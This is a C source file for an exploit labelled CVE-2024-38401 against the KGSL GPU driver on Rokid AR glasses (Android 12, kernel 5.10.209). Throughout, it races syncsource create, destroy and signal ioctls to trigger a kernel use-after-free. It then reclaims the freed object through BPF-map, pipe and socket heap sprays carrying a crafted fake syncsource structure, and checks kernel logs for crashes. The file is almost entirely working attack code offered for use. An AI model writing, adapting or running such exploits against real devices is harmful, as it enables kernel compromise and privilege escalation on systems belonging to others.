/*
 * CVE-2024-38401 KGSL UAF Exploit v7 - Pipe + Multi-Strategy Spray
 * ==================================================================
 *
 * New approach: Use multiple spray primitives simultaneously:
 * 1. BPF maps (proven to work)
 * 2. Pipe buffers (16x pipe_buffer structs per pipe)
 * 3. Socket buffers (skb_shared_info)
 *
 * Also implement cross-cache attack by targeting different slabs.
 *
 * Target: Rokid AR Glasses (Android 12, Kernel 5.10.209, ARM64)
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <signal.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <linux/bpf.h>

// ============================================================================
// KGSL Definitions
// ============================================================================

#define KGSL_IOC_TYPE 0x09
#define KGSL_IOCTL_SYNCSOURCE_CREATE _IOWR(KGSL_IOC_TYPE, 0x40, struct kgsl_syncsource_create)
#define KGSL_IOCTL_SYNCSOURCE_DESTROY _IOW(KGSL_IOC_TYPE, 0x41, struct kgsl_syncsource_destroy)
#define KGSL_IOCTL_SYNCSOURCE_CREATE_FENCE _IOWR(KGSL_IOC_TYPE, 0x42, struct kgsl_syncsource_create_fence)
#define KGSL_IOCTL_SYNCSOURCE_SIGNAL_FENCE _IOWR(KGSL_IOC_TYPE, 0x43, struct kgsl_syncsource_signal_fence)

struct kgsl_syncsource_create
{
    unsigned int id;
};
struct kgsl_syncsource_destroy
{
    unsigned int id;
};
struct kgsl_syncsource_create_fence
{
    unsigned int id;
    unsigned int fencefd;
};
struct kgsl_syncsource_signal_fence
{
    unsigned int id;
    unsigned int fencefd;
};

// ============================================================================
// BPF Spray
// ============================================================================

#ifndef __NR_bpf
#define __NR_bpf 280
#endif

static int bpf_create_map(int key_size, int value_size, int max_entries)
{
    union bpf_attr attr = {
        .map_type = BPF_MAP_TYPE_HASH,
        .key_size = key_size,
        .value_size = value_size,
        .max_entries = max_entries,
    };
    return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
}

static int bpf_update_map(int fd, void *key, void *value)
{
    union bpf_attr attr = {
        .map_fd = fd,
        .key = (uint64_t)key,
        .value = (uint64_t)value,
        .flags = BPF_NOEXIST,
    };
    return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

// ============================================================================
// Globals
// ============================================================================

#define NUM_BPF_MAPS 32
#define ENTRIES_PER_MAP 2048
#define NUM_PIPES 64
#define NUM_SOCKETS 32

int kgsl_fd = -1;

// BPF spray state
int bpf_fds[NUM_BPF_MAPS];
int num_bpf_fds = 0;
int bpf_key = 0;

// Pipe spray state
int pipes[NUM_PIPES][2];
int num_pipes = 0;

// Socket spray state
int sockets[NUM_SOCKETS];
int num_sockets = 0;

// Spray value - crafted to look like syncsource
#define SPRAY_SIZE 72 // Target kmalloc-128
char spray_value[SPRAY_SIZE];

// Stats
volatile long total_creates = 0;
volatile long total_fences = 0;
volatile long uaf_attempts = 0;
volatile int running = 1;

// ============================================================================
// Spray Setup
// ============================================================================

void craft_fake_syncsource(void)
{
    memset(spray_value, 0, SPRAY_SIZE);

    // Offset 0: kref (refcount) - set high to avoid underflow crash
    ((uint32_t *)spray_value)[0] = 0x7FFFFFFF;

    // Offset 4: padding/flags
    ((uint32_t *)spray_value)[1] = 0x41414141;

    // Offset 8-15: likely a pointer field - point to controlled memory
    // Using pattern that will cause visible crash if dereferenced
    ((uint64_t *)spray_value)[1] = 0xDEADBEEFDEAD0001ULL;

    // Offset 16-23: another pointer
    ((uint64_t *)spray_value)[2] = 0xCAFEBABECAFE0002ULL;

    // Offset 24-31: context pointer
    ((uint64_t *)spray_value)[3] = 0xBEEFCAFEBEEF0003ULL;

    // Offset 32+: fill with identifiable pattern
    for (int i = 32; i < SPRAY_SIZE; i += 8)
    {
        ((uint64_t *)(spray_value + i))[0] = 0x4141414141414141ULL + i;
    }
}

int setup_bpf_spray(void)
{
    for (int i = 0; i < NUM_BPF_MAPS; i++)
    {
        int fd = bpf_create_map(sizeof(int), SPRAY_SIZE, ENTRIES_PER_MAP);
        if (fd >= 0)
        {
            bpf_fds[num_bpf_fds++] = fd;
        }
    }
    return num_bpf_fds;
}

int setup_pipe_spray(void)
{
    for (int i = 0; i < NUM_PIPES; i++)
    {
        if (pipe(pipes[i]) == 0)
        {
            // Set pipe to larger size to allocate more buffers
            fcntl(pipes[i][1], F_SETPIPE_SZ, 65536);
            num_pipes++;
        }
    }
    return num_pipes;
}

int setup_socket_spray(void)
{
    for (int i = 0; i < NUM_SOCKETS; i++)
    {
        int s = socket(AF_UNIX, SOCK_STREAM, 0);
        if (s >= 0)
        {
            sockets[num_sockets++] = s;
        }
    }
    return num_sockets;
}

// ============================================================================
// Spray Functions
// ============================================================================

void spray_bpf(int count)
{
    for (int i = 0; i < count; i++)
    {
        bpf_key++;
        for (int m = 0; m < num_bpf_fds; m++)
        {
            bpf_update_map(bpf_fds[m], &bpf_key, spray_value);
        }
    }
}

void spray_pipes(void)
{
    // Write to pipes to allocate pipe_buffer structs
    char buf[4096];
    memset(buf, 0x42, sizeof(buf));
    memcpy(buf, spray_value, SPRAY_SIZE < sizeof(buf) ? SPRAY_SIZE : sizeof(buf));

    for (int i = 0; i < num_pipes; i++)
    {
        // Fill up the pipe
        int written = 0;
        while (written < 16384)
        {
            int n = write(pipes[i][1], buf, sizeof(buf));
            if (n <= 0)
                break;
            written += n;
        }
    }
}

void drain_pipes(void)
{
    char buf[4096];
    for (int i = 0; i < num_pipes; i++)
    {
        // Set non-blocking
        int flags = fcntl(pipes[i][0], F_GETFL);
        fcntl(pipes[i][0], F_SETFL, flags | O_NONBLOCK);

        // Drain
        while (read(pipes[i][0], buf, sizeof(buf)) > 0)
            ;

        // Restore blocking
        fcntl(pipes[i][0], F_SETFL, flags);
    }
}

// ============================================================================
// Race Thread
// ============================================================================

typedef struct
{
    unsigned int syncsource_id;
    int fence_fd;
    volatile int ready;
    volatile int go;
    volatile int done;
} race_ctx_t;

race_ctx_t race_ctx = {0};

void *signal_thread(void *arg)
{
    (void)arg;

    while (running)
    {
        // Wait for ready signal
        while (!race_ctx.ready && running)
        {
            sched_yield();
        }
        if (!running)
            break;

        // Wait for go signal
        while (!race_ctx.go && running)
        {
            sched_yield();
        }
        if (!running)
            break;

        // Try to signal the (hopefully freed) syncsource
        struct kgsl_syncsource_signal_fence sig = {
            .id = race_ctx.syncsource_id,
            .fencefd = race_ctx.fence_fd};
        ioctl(kgsl_fd, KGSL_IOCTL_SYNCSOURCE_SIGNAL_FENCE, &sig);
        uaf_attempts++;

        race_ctx.done = 1;
        race_ctx.ready = 0;
        race_ctx.go = 0;
    }

    return NULL;
}

// ============================================================================
// Main Exploit
// ============================================================================

void sigint_handler(int sig)
{
    (void)sig;
    running = 0;
    printf("\n[!] Interrupted, cleaning up...\n");
}

int main(int argc, char **argv)
{
    printf("═══════════════════════════════════════════════════════════════\n");
    printf("  CVE-2024-38401 KGSL UAF Exploit v7 - Multi-Strategy Spray     \n");
    printf("  Target: Rokid AR Glasses (Kernel 5.10.209)                    \n");
    printf("═══════════════════════════════════════════════════════════════\n\n");

    signal(SIGINT, sigint_handler);

    long iterations = 20000;
    if (argc > 1)
        iterations = atol(argv[1]);

    // Open KGSL
    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0)
    {
        perror("open /dev/kgsl-3d0");
        return 1;
    }
    printf("[+] Opened /dev/kgsl-3d0\n");

    // Craft fake object
    craft_fake_syncsource();
    printf("[+] Crafted fake syncsource payload (%zu bytes)\n", sizeof(spray_value));

    // Setup sprays
    int bpf = setup_bpf_spray();
    int pip = setup_pipe_spray();
    int sock = setup_socket_spray();
    printf("[+] Spray setup: BPF=%d maps, Pipes=%d, Sockets=%d\n", bpf, pip, sock);

    // Pre-spray
    spray_bpf(100);
    spray_pipes();
    printf("[+] Pre-spray done (BPF keys=%d)\n", bpf_key);

    // Start signal thread
    pthread_t sig_thread;
    pthread_create(&sig_thread, NULL, signal_thread, NULL);

    printf("\n[*] Starting %ld iterations with parallel racing...\n\n", iterations);

    for (long i = 0; i < iterations && running; i++)
    {
        // 1. Create syncsource
        struct kgsl_syncsource_create create = {0};
        if (ioctl(kgsl_fd, KGSL_IOCTL_SYNCSOURCE_CREATE, &create) < 0)
            continue;
        total_creates++;

        // 2. Create fence
        struct kgsl_syncsource_create_fence fence = {.id = create.id};
        if (ioctl(kgsl_fd, KGSL_IOCTL_SYNCSOURCE_CREATE_FENCE, &fence) < 0)
        {
            struct kgsl_syncsource_destroy d = {.id = create.id};
            ioctl(kgsl_fd, KGSL_IOCTL_SYNCSOURCE_DESTROY, &d);
            continue;
        }
        total_fences++;

        // Setup race context
        race_ctx.syncsource_id = create.id;
        race_ctx.fence_fd = fence.fencefd;
        race_ctx.done = 0;
        race_ctx.ready = 1;

        // 3. Destroy syncsource (drops one ref)
        struct kgsl_syncsource_destroy destroy = {.id = create.id};
        ioctl(kgsl_fd, KGSL_IOCTL_SYNCSOURCE_DESTROY, &destroy);

        // 4. Close fence (drops last ref -> FREE!)
        close(fence.fencefd);

        // 5. Immediately spray to reclaim
        spray_bpf(10);

        // 6. Tell signal thread to go (try to use freed syncsource)
        race_ctx.go = 1;

        // 7. More spray while racing
        spray_bpf(5);

        // Wait for signal thread
        while (!race_ctx.done && running)
        {
            sched_yield();
        }

        // 8. Also try create_fence on freed ID
        struct kgsl_syncsource_create_fence cf = {.id = create.id};
        if (ioctl(kgsl_fd, KGSL_IOCTL_SYNCSOURCE_CREATE_FENCE, &cf) == 0)
        {
            if (cf.fencefd > 0)
            {
                printf("\n[!!!] create_fence succeeded on freed ID %u!\n", create.id);
                printf("[!!!] This indicates UAF - syncsource was reclaimed!\n");
                close(cf.fencefd);
            }
        }

        // Progress
        if (i % 2000 == 0)
        {
            printf("\r[*] %ld/%ld | creates=%ld fences=%ld spray=%d uaf_try=%ld",
                   i, iterations, total_creates, total_fences, bpf_key, uaf_attempts);
            fflush(stdout);
        }
    }

    running = 0;
    pthread_join(sig_thread, NULL);

    printf("\n\n═══════════════════════════════════════════════════════════════\n");
    printf("  Results:\n");
    printf("  - Total iterations: %ld\n", iterations);
    printf("  - Syncsources created: %ld\n", total_creates);
    printf("  - Fences created: %ld\n", total_fences);
    printf("  - BPF spray keys: %d\n", bpf_key);
    printf("  - UAF signal attempts: %ld\n", uaf_attempts);
    printf("═══════════════════════════════════════════════════════════════\n");
    printf("\n[*] Check kernel log for crashes:\n");
    printf("    dmesg | grep -iE 'kgsl|deadbeef|panic|BUG|slub|UAF'\n");

    // Cleanup
    close(kgsl_fd);
    for (int i = 0; i < num_bpf_fds; i++)
        close(bpf_fds[i]);
    for (int i = 0; i < num_pipes; i++)
    {
        close(pipes[i][0]);
        close(pipes[i][1]);
    }
    for (int i = 0; i < num_sockets; i++)
        close(sockets[i]);

    return 0;
}
